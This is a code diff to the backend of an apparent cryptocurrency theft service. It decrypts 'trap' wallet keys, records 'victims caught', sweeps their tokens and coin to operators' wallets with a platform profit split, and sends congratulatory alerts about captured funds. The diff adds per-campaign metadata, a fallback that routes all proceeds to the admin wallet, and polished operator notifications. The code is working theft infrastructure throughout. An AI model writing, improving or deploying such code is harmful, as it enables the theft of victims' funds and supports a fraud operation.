@@ -38,7 +38,7 @@ if (supabaseUrl && supabaseServiceKey) {
 
 // --- Config ---
 const {
-  sweeper: { pollIntervalMs, safeWallet },
+  sweeper: { pollIntervalMs },
   rpc: { sweeper: sweeperRpcUrl },
 } = globalConfig;
 
@@ -56,10 +56,9 @@ const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
 let lastNoBalanceAlertTime = 0;
 const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
 const lastBalanceAlertTimes = new Map(); 
+const campaignMetadataCache = new Map();
 
-let cycleMetadataCache = null;
-
-// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER (Tier 1 & 2 Only)
+// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
 let priceCache = {};
 let lastPriceFetch = 0;
 let priceFetchPromise = null;
@@ -107,7 +106,7 @@ async function fetchTokenPrices() {
         logger.warn(`CoinGecko price fetch failed (${e.message}). Trying fallback...`);
       }
 
-      // ─── TIER 2: Binance API (Highly reliable for major pairs) ───
+      // ─── TIER 2: Binance API ───
       if (Object.keys(newCache).length < allSymbols.length) {
         try {
           const binancePairs = {
@@ -116,8 +115,7 @@ async function fetchTokenPrices() {
           };
           
           for (const sym of allSymbols) {
-            if (newCache[sym]) continue; // Already fetched successfully
-            
+            if (newCache[sym]) continue;
             const pair = binancePairs[sym];
             if (pair) {
               const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
@@ -141,7 +139,6 @@ async function fetchTokenPrices() {
     } catch (e) {
       logger.error(`Critical: All price fetch sources failed: ${e.message}`);
     } finally {
-      // 🚀 CRITICAL: Update lastPriceFetch EVEN ON FAILURE to enforce the 15-minute cooldown
       lastPriceFetch = Date.now();
       priceFetchPromise = null;
     }
@@ -151,15 +148,13 @@ async function fetchTokenPrices() {
   return priceFetchPromise;
 }
 
-// 🚀 FIX: Dual alert function that correctly routes to BOTH User and Admin
-async function sendDualAlert(message, type = 'info', specificCampaignId = null) {
+// 🚀 FIX: Custom dual alert for tailored professional messages
+async function sendCustomDualAlert(userMessage, adminMessage, specificCampaignId = null) {
   const targetCampaignId = specificCampaignId || campaignId;
-  
   if (targetCampaignId) {
-    await sendAlert(message, type, targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+    await sendAlert(userMessage, 'info', targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
   }
-  
-  await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
+  await sendAlert(adminMessage, 'info').catch(err => logger.warn(`Admin alert failed: ${err.message}`));
 }
 
 // --- Helper: check if job is cancelled ---
@@ -191,46 +186,61 @@ async function updateJob(status, progress = null, total = null, message = null) 
   }
 }
 
-// 🚀 OPTIMIZATION: Fetch and cache metadata ONCE per cycle
-async function getCycleMetadata() {
-  if (cycleMetadataCache) return cycleMetadataCache;
-  
-  let profitSplitPercent = 75;
-  let userSafeWallet = safeWallet;
-  let useSplitting = false;
-  let serviceWallet = SERVICE_WALLET;
-
-  if (campaignId && supabaseService) {
-    try {
-      const { data: campaign, error } = await supabaseService
-        .from('campaigns')
-        .select('user_id, safe_wallet_address')
-        .eq('id', campaignId)
-        .single();
-      
-      if (!error && campaign) {
-        const { data: user, error: userError } = await supabaseService
-          .from('users')
-          .select('profit_split_percent')
-          .eq('id', campaign.user_id)
-          .single();
-        
-        if (!userError && user) {
-          profitSplitPercent = user.profit_split_percent || 75;
-        }
-        userSafeWallet = campaign.safe_wallet_address;
-        useSplitting = true;
-        if (!serviceWallet) {
-          logger.warn('SERVICE_WALLET_ADDRESS not set – service share will be skipped');
-        }
-      }
-    } catch (err) {
-      logger.error(`Failed to fetch profit split: ${err.message}`);
-    }
+// 🚀 CRITICAL FIX: Fetch metadata strictly from the database PER CAMPAIGN
+async function getCampaignMetadata(campId) {
+  if (!campId) return null;
+  if (campaignMetadataCache.has(campId)) {
+    return campaignMetadataCache.get(campId);
   }
 
-  cycleMetadataCache = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet };
-  return cycleMetadataCache;
+  if (!supabaseService) {
+    logger.error('Supabase service not available to fetch campaign metadata.');
+    return null;
+  }
+
+  try {
+    const { data: campaign, error } = await supabaseService
+      .from('campaigns')
+      .select('user_id, safe_wallet_address')
+      .eq('id', campId)
+      .single();
+    
+    if (error || !campaign) {
+      logger.error(`Failed to fetch campaign ${campId}: ${error?.message}`);
+      return null;
+    }
+
+    const { data: user, error: userError } = await supabaseService
+      .from('users')
+      .select('profit_split_percent')
+      .eq('id', campaign.user_id)
+      .single();
+
+    const profitSplitPercent = (!userError && user) ? (user.profit_split_percent || 75) : 75;
+    let userSafeWallet = campaign.safe_wallet_address;
+    let fallbackToAdmin = false;
+
+    // 🚨 NEW LOGIC: If user safe wallet is missing, fallback to admin
+    if (!userSafeWallet) {
+      if (!SERVICE_WALLET) {
+        logger.error(`CRITICAL: Campaign ${campId} has no safe_wallet_address AND no SERVICE_WALLET is configured. Cannot sweep.`);
+        return null; // Abort if we have nowhere to send it
+      }
+      logger.warn(`Campaign ${campId} has no safe_wallet_address. Fallback to admin wallet enabled.`);
+      userSafeWallet = SERVICE_WALLET;
+      fallbackToAdmin = true;
+    }
+
+    const useSplitting = !!SERVICE_WALLET;
+    const serviceWallet = SERVICE_WALLET || null;
+
+    const metadata = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin };
+    campaignMetadataCache.set(campId, metadata);
+    return metadata;
+  } catch (err) {
+    logger.error(`Failed to fetch metadata for campaign ${campId}: ${err.message}`);
+    return null;
+  }
 }
 
 // --- Helpers: transaction & profit share records ---
@@ -284,8 +294,10 @@ async function markVictimCaught(victimAddress, trapCampaignId = null) {
   try {
     await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
     
-    const msg = `🎯 Victim caught\nVictim: ${addr}`;
-    await sendDualAlert(msg, 'info', trapCampaignId || campaignId);
+    const userMsg = `🎯 Congratulations! A victim has been successfully caught.\n\nVictim Address: ${addr}\nStatus: Trap activated and ready for sweeping.`;
+    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}`;
+    
+    await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
   } catch (err) {
     logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
   }
@@ -329,7 +341,7 @@ async function getTrapsFromDB(campId = null) {
           account,
           trapAddress: account.address.toLowerCase(),
           victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
-          campaignId: row.campaign_id, // 🚀 CRITICAL: Capture the trap's specific campaign ID
+          campaignId: row.campaign_id,
         });
       } catch (e) {
         logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
@@ -340,11 +352,6 @@ async function getTrapsFromDB(campId = null) {
     logger.error(`Failed to fetch traps: ${err.message}`);
     return [];
   }
-}
-
-if (!safeWallet) {
-  logger.error('SAFE_WALLET_ADDRESS is not set.');
-  process.exit(1);
 }
 
 let TOKEN_LIST = [];
@@ -388,9 +395,21 @@ const publicClient = createPublicClient({
 });
 
 // 🚀 OPTIMIZATION: Lazy execution helper
-async function executeSweepForTrap(entry, balances, metadata) {
-  const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry;
-  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
+async function executeSweepForTrap(entry, balances) {
+  const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
+  
+  let metadata;
+  if (singleDestination) {
+    metadata = { profitSplitPercent: 100, userSafeWallet: singleDestination, useSplitting: false, serviceWallet: null, fallbackToAdmin: false };
+  } else {
+    metadata = await getCampaignMetadata(trapCampaignId);
+    if (!metadata) {
+      logger.error(`Skipping trap ${trapAddress}: Could not resolve campaign metadata (missing safe_wallet_address and no admin fallback available).`);
+      return false;
+    }
+  }
+
+  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin } = metadata;
   const prices = await fetchTokenPrices();
   const isPriceFeedDown = Object.keys(prices).length === 0;
   let sweptAny = false;
@@ -422,7 +441,6 @@ async function executeSweepForTrap(entry, balances, metadata) {
     const usdValue = parseFloat(formatted) * tokenPrice;
     const isTokenPriceMissing = tokenPrice === 0;
     
-    // 🚀 FIX: If global feed is down OR this specific token's price is missing, use atomic threshold
     const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing) 
       ? tokenData.balance >= MIN_TOKEN_SWEEP 
       : usdValue >= MIN_SWEEP_USD;
@@ -434,10 +452,6 @@ async function executeSweepForTrap(entry, balances, metadata) {
     const now = Date.now();
     if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
       logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
-      
-      const alertMsg = `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`;
-      await sendDualAlert(alertMsg, 'info', trapCampaignId);
-      
       lastBalanceAlertTimes.set(alertKey, now);
     }
 
@@ -468,9 +482,15 @@ async function executeSweepForTrap(entry, balances, metadata) {
       };
 
       if (useSplitting && serviceWallet) {
-        const userShare = profitSplitPercent / 100;
-        userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
-        serviceAmount = tokenData.balance - userAmount;
+        // 🚨 If fallback to admin is active, user gets 0, admin gets 100%
+        if (fallbackToAdmin) {
+          userAmount = 0n;
+          serviceAmount = tokenData.balance;
+        } else {
+          const userShare = profitSplitPercent / 100;
+          userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
+          serviceAmount = tokenData.balance - userAmount;
+        }
 
         if (userAmount > 0n && userSafeWallet) {
           try {
@@ -498,8 +518,41 @@ async function executeSweepForTrap(entry, balances, metadata) {
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
         }
         
-        const alertMsg = `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
-        await sendDualAlert(alertMsg, 'info', trapCampaignId);
+        // 🚀 PROFESSIONAL NOTIFICATIONS
+        const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+        
+        if (fallbackToAdmin) {
+          const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
+            `Your trap successfully captured funds, but no safe wallet address was configured in your campaign settings.\n\n` +
+            `For the security of your assets, the captured funds (${formatted} ${token.symbol} ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
+            `👉 Action Required: Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
+            `🔗 TX: ${txHashShort}`;
+            
+          const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Trap: ${trapAddress}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
+            `🔗 TX: ${txHash}`;
+            
+          await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+        } else {
+          const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
+            `💰 Asset: ${token.symbol}\n` +
+            `📍 Trap: ${trapAddress}\n` +
+            `💵 Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
+            `✅ Status: Successfully swept to your safe wallet.\n\n` +
+            `🔗 TX: ${txHashShort}`;
+            
+          const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol}\n` +
+            `🔗 TX: ${txHash}`;
+            
+          await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+        }
       }
     } catch (e) {
       logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
@@ -514,7 +567,6 @@ async function executeSweepForTrap(entry, balances, metadata) {
     const usdValue = ethValue * nativePrice;
     const isNativePriceMissing = nativePrice === 0;
 
-    // 🚀 FIX: If global feed is down OR native price is missing, use atomic threshold
     const meetsThreshold = (isPriceFeedDown || isNativePriceMissing)
       ? spendableNativeFinal >= MIN_ETH_SWEEP
       : usdValue >= MIN_SWEEP_USD;
@@ -541,9 +593,14 @@ async function executeSweepForTrap(entry, balances, metadata) {
           };
 
           if (useSplitting && serviceWallet) {
-            const userShare = profitSplitPercent / 100;
-            userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
-            serviceAmount = totalSendable - userAmount;
+            if (fallbackToAdmin) {
+              userAmount = 0n;
+              serviceAmount = totalSendable;
+            } else {
+              const userShare = profitSplitPercent / 100;
+              userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
+              serviceAmount = totalSendable - userAmount;
+            }
 
             if (userAmount > 0n && userSafeWallet) {
               try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; } 
@@ -565,8 +622,41 @@ async function executeSweepForTrap(entry, balances, metadata) {
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
             }
             
-            const alertMsg = `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
-            await sendDualAlert(alertMsg, 'info', trapCampaignId);
+            // 🚀 PROFESSIONAL NOTIFICATIONS FOR NATIVE
+            const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+            
+            if (fallbackToAdmin) {
+              const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
+                `Your trap successfully captured ${nativeSymbol}, but no safe wallet address was configured.\n\n` +
+                `For security, the funds (${formatEther(totalSendable)} ${nativeSymbol} ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
+                `👉 Action Required: Please update your campaign's safe wallet address in your dashboard.\n\n` +
+                `🔗 TX: ${txHashShort}`;
+                
+              const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Trap: ${trapAddress}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `Reason: User safe wallet not configured.\n` +
+                `🔗 TX: ${txHash}`;
+                
+              await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+            } else {
+              const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
+                `💰 Asset: ${nativeSymbol}\n` +
+                `📍 Trap: ${trapAddress}\n` +
+                `💵 Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `✅ Status: Successfully swept to your safe wallet.\n\n` +
+                `🔗 TX: ${txHashShort}`;
+                
+              const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
+                `🔗 TX: ${txHash}`;
+                
+              await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+            }
           }
         }
       } catch (e) {
@@ -591,7 +681,10 @@ async function sweepBatch() {
   }
 
   if (entries.length === 0) {
-    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info', campaignId);
+    await sendCustomDualAlert(
+      `ℹ️ Sweep cycle complete: No traps found to process.`,
+      `[ADMIN] ℹ️ Sweep cycle complete: No traps found to process.`
+    , campaignId);
     return;
   }
 
@@ -601,9 +694,6 @@ async function sweepBatch() {
 
   logger.info(`Loaded ${entries.length} trap addresses`);
   
-  cycleMetadataCache = null;
-  const metadata = await getCycleMetadata();
-
   let isSweeping = false;
   const total = entries.length;
 
@@ -652,7 +742,7 @@ async function sweepBatch() {
             }
           }
 
-          const swept = await executeSweepForTrap(entry, trapBalances, metadata);
+          const swept = await executeSweepForTrap(entry, trapBalances);
           if (swept) anySwept = true;
           
           processedCount++;
@@ -663,7 +753,10 @@ async function sweepBatch() {
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
-          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`, 'info', campaignId);
+          await sendCustomDualAlert(
+            `ℹ️ Sweep cycle complete: No balances above thresholds were found for ${total} traps.`,
+            `[ADMIN] ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`
+          , campaignId);
           lastNoBalanceAlertTime = now;
         }
       } else {
@@ -701,7 +794,6 @@ async function sweepSingle(privateKey, destination) {
     if (isRunning) return;
     isRunning = true;
     try {
-      cycleMetadataCache = { profitSplitPercent: 100, userSafeWallet: destination, useSplitting: false, serviceWallet: null };
       const multicallContracts = TOKEN_LIST.map(token => ({
         address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
       }));
@@ -715,7 +807,8 @@ async function sweepSingle(privateKey, destination) {
           trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
         }
       });
-      await executeSweepForTrap({ account, trapAddress, victimAddress: null, campaignId: null }, trapBalances, cycleMetadataCache);
+      
+      await executeSweepForTrap({ account, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
     } catch (err) {
       logger.error(`Sweep error: ${err.message}`);
     } finally {
@@ -735,8 +828,8 @@ setInterval(loadCaughtVictims, 30000);
 if (jobId) updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));
 
 const privateKey = process.env.SWEEPER_PRIVATE_KEY;
-if (privateKey && safeWallet) {
-  await sweepSingle(privateKey, safeWallet);
+if (privateKey && process.env.SAFE_WALLET_ADDRESS) {
+  await sweepSingle(privateKey, process.env.SAFE_WALLET_ADDRESS);
 } else {
   await sweepBatch();
 }
